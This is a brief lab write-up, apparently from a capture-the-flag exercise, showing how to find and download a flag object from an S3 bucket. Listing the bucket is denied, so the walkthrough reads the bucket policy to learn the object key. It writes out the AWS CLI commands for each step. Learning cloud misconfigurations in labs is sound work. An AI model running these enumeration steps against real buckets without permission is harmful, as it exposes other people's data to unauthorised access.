In this lab, the bucket policy allows an anonymous user to read an object stored in the bucket but they cannot list the objects present in the bucket. There exists a misconfiguration in the bucket policy which can be leveraged to find the object key.

==================================================================

Listing s3 buckets --> `aws s3api list-buckets`
Checking bucket objects --> `aws s3api list-objects --bucket s3-readable-policy-517664638639`
Access Denied, cannot list bucket due to insufficient permissions

Check if bucket policy is readable --> `aws s3api get-bucket-policy --bucket s3-readable-policy-517664638639 --output text | python -m json.tool`
![[Pasted image 20210825202302.png]]

Downloading file from s3 bucket --> `aws s3 cp s3://s3-readable-policy-517664638639/this-is-flag .`
Flag retrieved

